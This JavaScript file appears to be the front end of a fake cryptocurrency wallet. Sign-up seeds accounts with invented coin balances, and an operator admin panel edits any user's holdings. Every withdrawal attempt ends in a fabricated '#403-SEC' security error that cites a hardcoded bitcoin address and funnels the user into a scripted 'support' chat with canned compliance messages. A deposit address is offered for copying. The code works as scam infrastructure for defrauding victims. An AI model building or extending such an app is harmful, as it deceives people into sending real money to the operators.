// ---------- SUPABASE CONFIGURATION ----------
const SUPABASE_URL = 'https://mcpldfcdfkfxmlrcndsq.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_SN1tATj8mKdNFv__RsRtUA_4cPSzpz4';
const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

let assets = [];
let currentUser = null;

// Check if user is already logged in on page load
document.addEventListener('DOMContentLoaded', async () => {
  const pageType = document.body.getAttribute('data-page');
  
  if (pageType === 'client') {
    const { data: { session } } = await sb.auth.getSession();
    if (session) {
      currentUser = session.user;
      enterDashboard();
    }
  } else if (pageType === 'admin') {
    if (typeof renderAdminDashboard === 'function') {
      renderAdminDashboard();
    }
  }
});

function getCryptoIcon(sym) {
  return `<span class="font-bold text-xs text-white">${sym ? sym.slice(0, 3) : 'COIN'}</span>`;
}

function switchView(viewId) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
  document.getElementById(viewId).classList.add('active');
}

// ---------- AUTHENTICATION (SUPABASE SIGN UP / SIGN IN) ----------
function setAuthTab(tab) {
  document.getElementById('tab-signin').classList.toggle('active', tab === 'signin');
  document.getElementById('tab-signup').classList.toggle('active', tab === 'signup');
  document.getElementById('form-signin').classList.toggle('hidden', tab !== 'signin');
  document.getElementById('form-signup').classList.toggle('hidden', tab !== 'signup');
}

async function handleAuth(e, mode) {
  e.preventDefault();
  
  if (mode === 'signin') {
    const email = document.getElementById('si-email').value.trim();
    const pass = document.getElementById('si-pass').value;

    const { data, error } = await sb.auth.signInWithPassword({ email, password: pass });
    if (error) {
      alert('Login failed: ' + error.message);
      return false;
    }
    currentUser = data.user;
  } else {
    const email = document.getElementById('su-email').value.trim();
    const pass = document.getElementById('su-pass').value;

    const { data, error } = await sb.auth.signUp({ email, password: pass });
    if (error) {
      alert('Sign up failed: ' + error.message);
      return false;
    }
    
    currentUser = data.user;
    const defaultName = currentUser.email.split('@')[0];
    const capitalizedName = defaultName.charAt(0).toUpperCase() + defaultName.slice(1);
    
    // Seed all default coins along with the user's initial display name
    const defaultCoins = [
      { user_id: currentUser.id, sym: 'BTC', name: 'Bitcoin', bal: 0.4250, price: 68420.00, pct: 3.42, color: '#F7931A', display_name: capitalizedName },
      { user_id: currentUser.id, sym: 'ETH', name: 'Ethereum', bal: 2.8500, price: 3540.50, pct: -1.20, color: '#627EEA', display_name: capitalizedName },
      { user_id: currentUser.id, sym: 'BNB', name: 'Binance Coin', bal: 6.5000, price: 615.20, pct: 2.15, color: '#F3BA2F', display_name: capitalizedName },
      { user_id: currentUser.id, sym: 'USDT', name: 'Tether USD', bal: 2450.00, price: 1.00, pct: 0.01, color: '#26A17B', display_name: capitalizedName },
      { user_id: currentUser.id, sym: 'SOL', name: 'Solana', bal: 18.4000, price: 178.90, pct: 6.84, color: '#14F195', display_name: capitalizedName }
    ];
    await sb.from('user_portfolios').insert(defaultCoins);
    alert('Account created successfully! Welcome to your wallet.');
  }

  enterDashboard();
  return false;
}

async function enterDashboard() {
  switchView('view-dashboard');
  
  const { data, error } = await sb.from('user_portfolios').select('*').eq('user_id', currentUser.id);
  if (data && data.length > 0) {
    assets = data;
    // Use the saved display_name from Supabase if available
    const profileName = data[0].display_name || currentUser.email.split('@')[0];
    const formattedName = profileName.charAt(0).toUpperCase() + profileName.slice(1);
    
    document.getElementById('welcome-username').textContent = formattedName;
    document.getElementById('user-avatar').textContent = formattedName.charAt(0).toUpperCase();
  } else {
    assets = [];
    const fallbackName = currentUser.email.split('@')[0];
    document.getElementById('welcome-username').textContent = fallbackName;
    document.getElementById('user-avatar').textContent = fallbackName.charAt(0).toUpperCase();
  }
  
  document.getElementById('wallet-addr').textContent = '0x' + currentUser.id.slice(0, 6) + '...' + currentUser.id.slice(-4);
  renderClientDashboard();
}

async function logout() {
  await sb.auth.signOut();
  currentUser = null;
  switchView('view-auth');
}

// ---------- CLIENT DASHBOARD RENDER ----------
function fmtUSD(n) {
  return '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function renderClientDashboard() {
  let totalUSD = 0;
  const list = document.getElementById('asset-list');
  if (!list) return;

  list.innerHTML = assets.map(a => {
    const usdVal = Number(a.bal) * Number(a.price);
    totalUSD += usdVal;
    return `
      <div onclick="openTransferModal()" class="flex items-center justify-between px-6 py-4 hover:bg-[var(--surface-2)]/50 transition-colors cursor-pointer">
        <div class="flex items-center gap-3.5">
          <div class="w-10 h-10 rounded-full flex items-center justify-center shrink-0 shadow-md" style="background:${a.color || '#0C6CF2'}">
            ${getCryptoIcon(a.sym)}
          </div>
          <div>
            <div class="flex items-center gap-2">
              <p class="font-bold text-sm">${a.name}</p>
              <span class="text-xs text-[var(--muted)] font-medium">${a.sym}</span>
            </div>
            <p class="text-xs text-[var(--muted)] mono mt-0.5">${fmtUSD(a.price)}</p>
          </div>
        </div>
        <div class="text-right">
          <p class="font-bold text-sm mono">${fmtUSD(usdVal)}</p>
          <div class="flex items-center justify-end gap-2 mt-0.5">
            <span class="text-xs text-[var(--muted)] mono">${a.bal} ${a.sym}</span>
            <span class="text-xs font-semibold ${a.pct >= 0 ? 'up' : 'down'}">${a.pct >= 0 ? '▲' : '▼'}${Math.abs(a.pct)}%</span>
          </div>
        </div>
      </div>`;
  }).join('');

  document.getElementById('total-balance').textContent = fmtUSD(totalUSD);
}

// ---------- TRUST WALLET STYLE TRANSFER / WITHDRAWAL MODAL LOGIC ----------
function openTransferModal() {
  openModal('modal-transfer');
}

function handleTransferSubmit(e) {
  e.preventDefault();
  
  const coin = document.getElementById('transfer-coin').value;
  const address = document.getElementById('transfer-address').value.trim();
  const amount = document.getElementById('transfer-amount').value;

  // Close the transfer modal popup
  closeModal('modal-transfer');

  // Trigger the restricted security error modal using the specified node destination address
  const errorDetailEl = document.getElementById('error-detail');
  if (errorDetailEl) {
    errorDetailEl.textContent = 
      `Outgoing transfer of ${amount} ${coin} to destination address (${address}) routed through secure node [bc1qz4sjkd58wsp003xzmatg0e8kw5yu24dth7cqah] has triggered security checkpoint #403-SEC. Manual compliance review required.`;
  }
  
  openModal('modal-error');
  return false;
}

// ---------- RECEIVE BITCOIN MODAL & CLIPBOARD COPY ----------
function openReceiveModal() {
  openModal('modal-receive');
}

function copyReceiveAddress() {
  const addrElem = document.getElementById('receive-btc-address');
  const btn = document.getElementById('btn-copy-btc');
  
  if (!addrElem) return;
  const addr = addrElem.textContent.trim();
  
  navigator.clipboard.writeText(addr).then(() => {
    btn.innerHTML = '<span>✓</span> Address Copied!';
    setTimeout(() => {
      btn.innerHTML = '<span>📋</span> Copy Address';
    }, 2500);
  }).catch(() => {
    alert('Bitcoin Deposit Address: ' + addr);
  });
}

// ---------- ADMIN CONTROL PANEL (EDIT USER NAMES & PORTFOLIOS) ----------
async function renderAdminDashboard() {
  const { data: allPortfolios, error } = await sb.from('user_portfolios').select('*').order('user_id', { ascending: true });
  const grid = document.getElementById('admin-assets-grid');
  if (!grid) return;

  if (error || !allPortfolios || allPortfolios.length === 0) {
    grid.innerHTML = `<p class="text-xs text-[var(--muted)]">No user portfolios found in Supabase yet. Have users sign up first.</p>`;
    return;
  }

  // Renders editable inputs for User Display Name, Coin Name, and Balance Qty
  grid.innerHTML = allPortfolios.map((a, idx) => `
    <div class="p-4 rounded-xl bg-[var(--surface-2)] border border-[var(--border)] space-y-3">
      <div class="flex items-center justify-between">
        <span class="font-bold text-xs text-[var(--muted)]">User ID: ${a.user_id.slice(0, 8)}...</span>
        <span class="px-2 py-0.5 text-[10px] rounded bg-blue-500/20 text-blue-400 font-semibold">${a.sym}</span>
      </div>
      
      <div>
        <label class="text-[10px] font-semibold text-[var(--muted)] uppercase block mb-1">Edit User Profile Name (Welcome Name)</label>
        <input type="text" id="admin-username-${idx}" value="${a.display_name || 'User'}" class="input w-full px-2.5 py-1.5 text-xs bg-[#12161F] text-white border border-[var(--border)] rounded">
      </div>

      <div class="grid grid-cols-2 gap-2.5">
        <div>
          <label class="text-[10px] font-semibold text-[var(--muted)] uppercase block mb-1">Coin Name</label>
          <input type="text" id="admin-name-${idx}" value="${a.name}" class="input w-full px-2.5 py-1.5 text-xs bg-[#12161F] text-white border border-[var(--border)] rounded">
        </div>
        <div>
          <label class="text-[10px] font-semibold text-[var(--muted)] uppercase block mb-1">Balance Qty (Can be 0)</label>
          <input type="number" step="any" id="admin-bal-${idx}" value="${a.bal}" class="input mono w-full px-2.5 py-1.5 text-xs bg-[#12161F] text-white border border-[var(--border)] rounded">
        </div>
      </div>
      <input type="hidden" id="admin-row-id-${idx}" value="${a.id}">
      <input type="hidden" id="admin-userid-${idx}" value="${a.user_id}">
    </div>
  `).join('');
  
  window.adminPortfoliosCache = allPortfolios;
}

async function saveAdminChanges() {
  const btn = document.getElementById('btn-save-admin');
  if (!btn) return;
  btn.textContent = 'Saving...';

  const cache = window.adminPortfoliosCache || [];
  for (let idx = 0; idx < cache.length; idx++) {
    const rowIdInput = document.getElementById(`admin-row-id-${idx}`);
    const userIdInput = document.getElementById(`admin-userid-${idx}`);
    const userNameInput = document.getElementById(`admin-username-${idx}`);
    const nameInput = document.getElementById(`admin-name-${idx}`);
    const balInput = document.getElementById(`admin-bal-${idx}`);
    
    if (rowIdInput && userNameInput && nameInput && balInput) {
      const rowId = rowIdInput.value;
      const userId = userIdInput.value;
      const newDisplayName = userNameInput.value.trim();
      const nameVal = nameInput.value.trim();
      const balVal = parseFloat(balInput.value);

      // Updates this specific coin entry AND updates the display name for this user across all their coin rows
      await sb.from('user_portfolios').update({
        display_name: newDisplayName !== '' ? newDisplayName : 'User',
        name: nameVal !== '' ? nameVal : 'Coin',
        bal: !isNaN(balVal) ? balVal : 0
      }).eq('id', rowId);
    }
  }

  btn.textContent = '✓ Update & Sync to Supabase';
  const toast = document.getElementById('admin-toast');
  if (toast) {
    toast.classList.remove('hidden');
    setTimeout(() => toast.classList.add('hidden'), 3500);
  }
}

// ---------- UNIVERSAL ERROR MODAL & SUPPORT CHAT ----------
function openRestrictedAction(actionName) {
  document.getElementById('error-detail').textContent = 
    `Something went wrong while processing your request for [${actionName}]. Account security restriction #403-SEC active. Please contact support to proceed with your withdrawal.`;
  openModal('modal-error');
}

function openModal(id) {
  const m = document.getElementById(id);
  m.classList.remove('hidden');
  m.classList.add('flex');
}
function closeModal(id) {
  const m = document.getElementById(id);
  m.classList.add('hidden');
  m.classList.remove('flex');
}

function triggerSupportFromError() {
  closeModal('modal-error');
  openChat();
  setTimeout(() => {
    addChatMsg('user', "I am trying to complete a transaction/withdrawal, but I received error #403-SEC. Please help.");
    setTimeout(() => {
      addChatMsg('agent', "I've flagged your session. A security compliance specialist is reviewing your account to lift the restriction.");
    }, 600);
  }, 300);
}

let chatStarted = false;
function openChat() {
  document.getElementById('chat-overlay').classList.remove('hidden');
  document.getElementById('chat-drawer').classList.add('open');
  if (!chatStarted) {
    chatStarted = true;
    addChatMsg('agent', "Welcome to Blockchain Support. How can we help you resolve your transaction today?");
  }
}
function closeChat() {
  document.getElementById('chat-overlay').classList.add('hidden');
  document.getElementById('chat-drawer').classList.remove('open');
}
function addChatMsg(from, text) {
  const wrap = document.getElementById('chat-messages');
  if (!wrap) return;
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  const div = document.createElement('div');
  div.className = from === 'agent' ? 'flex flex-col items-start' : 'flex flex-col items-end';
  div.innerHTML = `
    <div class="max-w-[82%] rounded-2xl px-3.5 py-2.5 text-sm leading-relaxed ${
      from === 'agent'
        ? 'bg-[var(--surface-2)] border border-[var(--border)] text-[var(--text)] rounded-tl-sm'
        : 'bg-[#0C6CF2] text-white rounded-tr-sm'
    }">${text}</div>
    <span class="text-[10px] text-[var(--muted)] mt-1 px-1">${time}</span>
  `;
  wrap.appendChild(div);
  wrap.scrollTop = wrap.scrollHeight;
}
function sendQuickReply(text) {
  addChatMsg('user', text);
  setTimeout(() => {
    addChatMsg('agent', "Thank you. Our compliance team is verifying your wallet session. Please stay on this window.");
  }, 600);
}
function sendChatMessage(e) {
  e.preventDefault();
  const input = document.getElementById('chat-input');
  const text = input.value.trim();
  if (!text) return false;
  addChatMsg('user', text);
  input.value = '';
  setTimeout(() => {
    addChatMsg('agent', "thank you for contacting support, click on the chat box below to connect with an bitcoin support agent.");
  }, 700);
  return false;
}